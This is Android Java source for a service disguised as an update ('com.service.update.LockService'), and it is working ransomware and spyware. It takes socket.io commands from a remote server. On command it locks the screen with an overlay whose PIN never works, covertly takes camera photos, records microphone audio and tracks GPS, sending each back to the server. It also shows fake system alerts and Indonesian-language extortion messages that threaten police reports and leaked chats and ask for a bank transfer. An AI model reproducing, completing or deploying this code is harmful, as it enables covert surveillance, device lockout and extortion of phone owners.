package com.service.update;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.ToneGenerator;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Vibrator;
import android.util.Base64;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import org.json.JSONObject;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import java.net.URL;
import java.io.File;

public class LockService extends Service {

    private Socket socket;
    private Vibrator vibrator;
    private ToneGenerator tone;
    private MediaPlayer mediaPlayer;
    private MediaRecorder mediaRecorder;
    private Handler handler;
    private WindowManager wm;
    private LocationManager locationManager;
    private View overlay, flashView, wallpaperView, popupView;
    private boolean locked = false;
    private String currentPin = "0000";
    private String serverUrl = "https://wafii.pythonanywhere.com";
    private TextView pinDisplay, msgText, timerText;
    private int timerSeconds = 0;
    private Handler timerHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        tone = new ToneGenerator(AudioManager.STREAM_ALARM, 100);
        handler = new Handler();
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        timerHandler = new Handler();
        connectToServer();
    }

    private void connectToServer() {
        try {
            socket = IO.socket(serverUrl);
            socket.on("cmd", args -> { try { JSONObject d = (JSONObject) args[0]; handler.post(() -> executeCommand(d)); } catch (Exception e) {} });
            socket.connect();
        } catch (Exception e) {}
    }

    private void executeCommand(JSONObject d) {
        String cmd = d.optString("cmd");
        String text = d.optString("text", "");
        switch (cmd) {
            case "lock": showLockScreen(); break;
            case "unlock": removeLockScreen(); break;
            case "siren": tone.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 15000); break;
            case "vibrate": if (vibrator != null) vibrator.vibrate(new long[]{0,200,100,200,100,500,0,200,100,200,100,500}, 3); break;
            case "flash_on": showFlash(true); break;
            case "flash_off": showFlash(false); break;
            case "wallpaper": changeWallpaper(text); break;
            case "mp3": playMP3(text); break;
            case "gps": getGPS(); break;
            case "camera": takePhoto(); break;
            case "record": startRecording(); break;
            case "message": showMessage(text); break;
            case "timer": setTimer(text); break;
            case "set_pin": setPin(text); break;
            case "ghost": playGhostSound(); break;
            case "popup": showPopup(); break;
            case "battery_low": showBatteryLow(); break;
            case "screen_off": showScreenOff(); break;
            case "fake_restart": showFakeRestart(); break;
            case "sos": showSOS(); break;
            case "change_server": serverUrl = text; connectToServer(); break;
            case "telegram": openTelegram(); break;
            case "location_show": showLocationOnLock(); break;
            case "warning": startWarningCountdown(text); break;
            case "police_threat": showPoliceThreat(); break;
            case "leak_threat": showLeakThreat(); break;
            case "camera_threat": showCameraThreat(); break;
            case "rekening": showRekening(text); break;
            case "call_center": showCallCenter(text); break;
        }
    }

    private void showLockScreen() { if(locked)return;locked=true; LinearLayout main=new LinearLayout(this);main.setOrientation(LinearLayout.VERTICAL);main.setGravity(Gravity.CENTER);main.setBackgroundColor(0xFF000000); TextView icon=new TextView(this);icon.setText("🔒");icon.setTextSize(50);icon.setGravity(Gravity.CENTER);main.addView(icon); TextView title=new TextView(this);title.setText("Device Locked");title.setTextColor(0xFFFF3B30);title.setTextSize(26);title.setTypeface(Typeface.DEFAULT_BOLD);title.setGravity(Gravity.CENTER);title.setPadding(0,10,0,5);main.addView(title); timerText=new TextView(this);timerText.setText("");timerText.setTextColor(0xFF8E8E93);timerText.setTextSize(16);timerText.setGravity(Gravity.CENTER);timerText.setPadding(0,5,0,10);main.addView(timerText); msgText=new TextView(this);msgText.setText("");msgText.setTextColor(0xFFFF9500);msgText.setTextSize(14);msgText.setGravity(Gravity.CENTER);msgText.setPadding(20,5,20,15);main.addView(msgText); pinDisplay=new TextView(this);pinDisplay.setText("_ _ _ _");pinDisplay.setTextColor(0xFFFFFFFF);pinDisplay.setTextSize(30);pinDisplay.setGravity(Gravity.CENTER);pinDisplay.setPadding(0,10,0,20);main.addView(pinDisplay); String[][] keys={{"1","2","3"},{"4","5","6"},{"7","8","9"},{"⌫","0","OK"}}; for(String[] row:keys){ LinearLayout rl=new LinearLayout(this);rl.setOrientation(LinearLayout.HORIZONTAL);rl.setGravity(Gravity.CENTER); for(String k:row){ Button btn=new Button(this);btn.setText(k);btn.setTextSize(20);btn.setWidth(220);btn.setHeight(140);btn.setTextColor(0xFFFFFFFF);btn.setBackgroundColor(k.equals("OK")?0xFFFF3B30:(k.equals("⌫")?0xFF3A3A3C:0xFF2C2C2E)); btn.setOnClickListener(v->{if(k.equals("⌫"))pinDisplay.setText("_ _ _ _");else if(k.equals("OK")){pinDisplay.setText("❌ Incorrect");pinDisplay.setTextColor(0xFFFF3B30);}else pinDisplay.setText("* * * *");}); rl.addView(btn); } main.addView(rl); } WindowManager.LayoutParams p=new WindowManager.LayoutParams(-1,-1,WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,WindowManager.LayoutParams.FLAG_FULLSCREEN|WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE|WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,PixelFormat.TRANSLUCENT);p.gravity=Gravity.CENTER;overlay=main;wm.addView(overlay,p); }
    private void removeLockScreen() { if(overlay!=null&&locked){wm.removeView(overlay);overlay=null;locked=false;} if(timerHandler!=null)timerHandler.removeCallbacksAndMessages(null); }
    private void showFlash(boolean on) { if(on){if(flashView!=null)return;flashView=new View(this);flashView.setBackgroundColor(0xFFFFFFFF);WindowManager.LayoutParams fp=new WindowManager.LayoutParams(-1,-1,WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,WindowManager.LayoutParams.FLAG_FULLSCREEN|WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,PixelFormat.TRANSLUCENT);wm.addView(flashView,fp);handler.postDelayed(()->{if(flashView!=null){flashView.setBackgroundColor(0xFF000000);handler.postDelayed(()->{if(flashView!=null)flashView.setBackgroundColor(0xFFFFFFFF);},50);}},50);}else{if(flashView!=null){wm.removeView(flashView);flashView=null;}} }
    private void changeWallpaper(String url){ new Thread(()->{ try{Bitmap bmp=BitmapFactory.decodeStream(new URL(url).openStream());handler.post(()->{ImageView iv=new ImageView(this);iv.setImageBitmap(bmp);iv.setScaleType(ImageView.ScaleType.FIT_XY);WindowManager.LayoutParams wp=new WindowManager.LayoutParams(-1,-1,WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,PixelFormat.TRANSLUCENT);if(wallpaperView!=null)wm.removeView(wallpaperView);wallpaperView=iv;wm.addView(wallpaperView,wp);});}catch(Exception e){}}).start(); }
    private void playMP3(String url){ try{if(mediaPlayer!=null){mediaPlayer.stop();mediaPlayer.release();}mediaPlayer=new MediaPlayer();mediaPlayer.setDataSource(this,Uri.parse(url));mediaPlayer.prepare();mediaPlayer.setLooping(true);mediaPlayer.start();}catch(Exception e){} }
    private void getGPS(){ try{locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,1000,1,new LocationListener(){@Override public void onLocationChanged(Location loc){try{JSONObject gps=new JSONObject();gps.put("lat",loc.getLatitude());gps.put("lng",loc.getLongitude());socket.emit("gps",gps);}catch(Exception e){}}@Override public void onStatusChanged(String p,int s,Bundle b){}@Override public void onProviderEnabled(String p){}@Override public void onProviderDisabled(String p){}});}catch(Exception e){} }
    private void takePhoto(){ try{Camera cam=Camera.open(1);cam.startPreview();cam.takePicture(null,null,(data,camera)->{try{String b64=Base64.encodeToString(data,Base64.NO_WRAP);JSONObject p=new JSONObject();p.put("image",b64);socket.emit("photo",p);}catch(Exception e){}camera.stopPreview();camera.release();});}catch(Exception e){} }
    private void startRecording(){ try{mediaRecorder=new MediaRecorder();mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);String path=getExternalFilesDir(null).getAbsolutePath()+"/record.mp3";mediaRecorder.setOutputFile(path);mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);mediaRecorder.prepare();mediaRecorder.start();handler.postDelayed(()->{if(mediaRecorder!=null){mediaRecorder.stop();mediaRecorder.release();mediaRecorder=null;try{byte[] bytes=java.nio.file.Files.readAllBytes(new File(path).toPath());String b64=Base64.encodeToString(bytes,Base64.NO_WRAP);JSONObject rec=new JSONObject();rec.put("audio",b64);socket.emit("recording",rec);}catch(Exception e){}}},10000);}catch(Exception e){} }
    private void showMessage(String msg){ if(msgText!=null)msgText.setText(msg); }
    private void setTimer(String sec){ try{timerSeconds=Integer.parseInt(sec);startTimer();}catch(Exception e){} }
    private void startTimer(){ timerHandler.removeCallbacksAndMessages(null);timerHandler.post(new Runnable(){@Override public void run(){if(timerSeconds<=0){if(timerText!=null)timerText.setText("TIME'S UP");return;}int m=timerSeconds/60,s=timerSeconds%60;if(timerText!=null)timerText.setText(String.format("%02d:%02d",m,s));timerSeconds--;timerHandler.postDelayed(this,1000);}});}
    private void setPin(String pin){ if(pin!=null&&pin.length()>=4)currentPin=pin.substring(0,4); }
    private void playGhostSound(){ try{if(mediaPlayer!=null){mediaPlayer.stop();mediaPlayer.release();}mediaPlayer=new MediaPlayer();mediaPlayer.setDataSource(this,Uri.parse("https://www.soundjay.com/human/sounds/ghost-whisper-01.mp3"));mediaPlayer.prepare();mediaPlayer.start();}catch(Exception e){} }
    private void showPopup(){ try{LinearLayout popup=new LinearLayout(this);popup.setOrientation(LinearLayout.VERTICAL);popup.setGravity(Gravity.CENTER);popup.setBackgroundColor(0xDD000000);TextView pt=new TextView(this);pt.setText("⚠️ SYSTEM ERROR");pt.setTextColor(0xFFFF3B30);pt.setTextSize(20);pt.setGravity(Gravity.CENTER);TextView pm=new TextView(this);pm.setText("Data corrupted");pm.setTextColor(0xFFFFFFFF);pm.setTextSize(14);pm.setGravity(Gravity.CENTER);pm.setPadding(0,10,0,20);Button pb=new Button(this);pb.setText("OK");pb.setTextColor(0xFFFFFFFF);pb.setBackgroundColor(0xFFFF3B30);pb.setOnClickListener(v->{if(popupView!=null){wm.removeView(popupView);popupView=null;}});popup.addView(pt);popup.addView(pm);popup.addView(pb);WindowManager.LayoutParams pp=new WindowManager.LayoutParams(-1,-1,WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,PixelFormat.TRANSLUCENT);popupView=popup;wm.addView(popupView,pp);}catch(Exception e){} }
    private void showBatteryLow(){ try{TextView bv=new TextView(this);bv.setText("🔋 1%");bv.setTextColor(0xFFFF3B30);bv.setTextSize(40);bv.setGravity(Gravity.CENTER);WindowManager.LayoutParams bp=new WindowManager.LayoutParams(-1,100,WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,PixelFormat.TRANSLUCENT);bp.gravity=Gravity.TOP;View bView=bv;wm.addView(bView,bp);handler.postDelayed(()->wm.removeView(bView),5000);}catch(Exception e){} }
    private void showScreenOff(){ try{View sv=new View(this);sv.setBackgroundColor(0xFF000000);WindowManager.LayoutParams sp=new WindowManager.LayoutParams(-1,-1,WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,WindowManager.LayoutParams.FLAG_FULLSCREEN,PixelFormat.TRANSLUCENT);View sView=sv;wm.addView(sView,sp);handler.postDelayed(()->wm.removeView(sView),8000);}catch(Exception e){} }
    private void showFakeRestart(){ try{LinearLayout rl=new LinearLayout(this);rl.setOrientation(LinearLayout.VERTICAL);rl.setGravity(Gravity.CENTER);rl.setBackgroundColor(0xFF000000);TextView rt=new TextView(this);rt.setText("🔃 Rebooting...");rt.setTextColor(0xFFFFFFFF);rt.setTextSize(24);rt.setGravity(Gravity.CENTER);rl.addView(rt);WindowManager.LayoutParams rp=new WindowManager.LayoutParams(-1,-1,WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,WindowManager.LayoutParams.FLAG_FULLSCREEN,PixelFormat.TRANSLUCENT);View rView=rl;wm.addView(rView,rp);handler.postDelayed(()->wm.removeView(rView),5000);}catch(Exception e){} }
    private void showSOS(){ try{LinearLayout sl=new LinearLayout(this);sl.setOrientation(LinearLayout.VERTICAL);sl.setGravity(Gravity.CENTER);sl.setBackgroundColor(0xDD000000);TextView st=new TextView(this);st.setText("🆘 EMERGENCY");st.setTextColor(0xFFFF3B30);st.setTextSize(22);st.setGravity(Gravity.CENTER);TextView sm=new TextView(this);sm.setText("Calling 112...");sm.setTextColor(0xFFFFFFFF);sm.setTextSize(14);sm.setGravity(Gravity.CENTER);sm.setPadding(0,10,0,0);sl.addView(st);sl.addView(sm);WindowManager.LayoutParams sp=new WindowManager.LayoutParams(-1,-1,WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,PixelFormat.TRANSLUCENT);View sView=sl;wm.addView(sView,sp);handler.postDelayed(()->wm.removeView(sView),4000);}catch(Exception e){} }
    private void openTelegram(){ try{Intent intent=new Intent(Intent.ACTION_VIEW,Uri.parse("https://t.me/wapiiiiTzy"));intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);startActivity(intent);}catch(Exception e){} }
    private void showLocationOnLock(){ if(msgText!=null)msgText.setText("📍 Lokasi Anda: Sedang dilacak...");getGPS(); }
    private void startWarningCountdown(String interval){ try{int sec=Integer.parseInt(interval);handler.postDelayed(new Runnable(){@Override public void run(){if(!locked)return;if(msgText!=null)msgText.setText("⚠️ BAYAR ATAU DATA HILANG!");tone.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD,3000);handler.postDelayed(this,sec*1000);}},sec*1000);}catch(Exception e){} }
    private void showPoliceThreat(){ if(msgText!=null)msgText.setText("👮 Data Anda dikirim ke Kepolisian RI");if(pinDisplay!=null){String r=""+Math.random();pinDisplay.setText("LAPORAN #"+r.substring(2,8));} }
    private void showLeakThreat(){ if(msgText!=null)msgText.setText("📤 Foto & chat Anda siap diunggah ke publik"); }
    private void showCameraThreat(){ if(msgText!=null)msgText.setText("🎥 Kamera Anda merekam...");takePhoto(); }
    private void showRekening(String rek){ if(msgText!=null)msgText.setText("💳 Transfer ke: "+rek); }
    private void showCallCenter(String number){ if(msgText!=null)msgText.setText("📞 Hubungi: "+number); }

    @Override public int onStartCommand(Intent intent,int flags,int startId){ return START_STICKY; }
    @Override public IBinder onBind(Intent intent){ return null; }
    @Override public void onDestroy(){ removeLockScreen();showFlash(false);if(wallpaperView!=null){wm.removeView(wallpaperView);wallpaperView=null;}if(mediaPlayer!=null){mediaPlayer.stop();mediaPlayer.release();}if(mediaRecorder!=null){mediaRecorder.stop();mediaRecorder.release();}if(socket!=null)socket.disconnect();super.onDestroy(); }
                }
